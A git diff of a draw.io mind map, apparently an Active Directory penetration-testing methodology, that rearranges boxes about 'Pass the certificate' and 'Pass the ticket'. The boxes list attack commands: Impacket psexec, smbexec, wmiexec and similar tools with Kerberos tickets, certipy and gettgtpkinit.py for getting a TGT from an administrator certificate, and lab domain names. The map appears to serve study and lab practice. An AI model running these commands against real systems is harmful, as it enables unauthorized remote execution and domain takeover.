@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2023-03-27T13:47:10.820Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" etag="h4sFHfFuLWB9US4HIfb8" version="21.1.1" type="github" pages="6">
+<mxfile host="app.diagrams.net" modified="2023-03-27T13:48:15.007Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" etag="gV-QEzX4UXFR-gvNonTO" version="21.1.1" type="github" pages="6">
   <diagram id="OxgtQte6AoLRu1fJhFKF" name="Reconnaissance">
     <mxGraphModel dx="3083" dy="882" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -703,8 +703,11 @@
       <root>
         <mxCell id="0" />
         <mxCell id="1" parent="0" />
+        <mxCell id="ofW6ee_2hHjbur6R9mH3-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="Mr1Rn-nBtmzZ--9cH1cQ-3" target="nNKB30-F6r5E_Skve4N4-2">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
         <mxCell id="Mr1Rn-nBtmzZ--9cH1cQ-3" value="&lt;div&gt;&lt;div align=&quot;center&quot;&gt;Pass the ticket (exec commands)&lt;br&gt;&lt;/div&gt;&lt;div align=&quot;center&quot;&gt;&lt;br&gt;&lt;/div&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;psexec.py -k &#39;DOMAIN/USER@TARGET&#39; -no-pass&lt;br&gt;smbexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;wmiexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;atexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;br&gt;dcomexec.py -k &#39;DOMAIN/USER@TARGET&#39;&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-          <mxGeometry x="550" y="160" width="320" height="190" as="geometry" />
+          <mxGeometry x="810" y="260" width="320" height="190" as="geometry" />
         </mxCell>
         <mxCell id="nNKB30-F6r5E_Skve4N4-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="nNKB30-F6r5E_Skve4N4-1" target="nNKB30-F6r5E_Skve4N4-3">
           <mxGeometry relative="1" as="geometry" />
@@ -713,13 +716,22 @@
           <mxGeometry x="20" y="325" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="nNKB30-F6r5E_Skve4N4-2" value="Accès machine" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#a20025;fontColor=#ffffff;strokeColor=#6F0000;" vertex="1" parent="1">
-          <mxGeometry x="1010" y="330" width="120" height="60" as="geometry" />
+          <mxGeometry x="1270" y="325" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="nNKB30-F6r5E_Skve4N4-3" value="&lt;div&gt;Pass the certificate to get TGT&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-          <mxGeometry x="230" y="293" width="220" height="125" as="geometry" />
+        <mxCell id="ofW6ee_2hHjbur6R9mH3-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="nNKB30-F6r5E_Skve4N4-3" target="ofW6ee_2hHjbur6R9mH3-1">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="nNKB30-F6r5E_Skve4N4-3" value="&lt;div&gt;Pass the certificate&lt;br&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="230" y="293" width="320" height="125" as="geometry" />
         </mxCell>
         <mxCell id="c2D2YZhtQaV_8EULeIIU-1" value="&lt;div align=&quot;left&quot;&gt;If clock errors:&lt;br&gt;&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;-detect remote clock-skew : nmap -sV -sC 10.10.11.202&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;- faketime&lt;br&gt; &lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;align=left;fillColor=#f0a30a;strokeColor=#BD7000;fontColor=#000000;" vertex="1" parent="1">
-          <mxGeometry x="180" y="460" width="320" height="80" as="geometry" />
+          <mxGeometry x="230" y="430" width="320" height="80" as="geometry" />
+        </mxCell>
+        <mxCell id="ofW6ee_2hHjbur6R9mH3-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="ofW6ee_2hHjbur6R9mH3-1" target="Mr1Rn-nBtmzZ--9cH1cQ-3">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="ofW6ee_2hHjbur6R9mH3-1" value="Get TGT" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="630" y="326" width="120" height="60" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
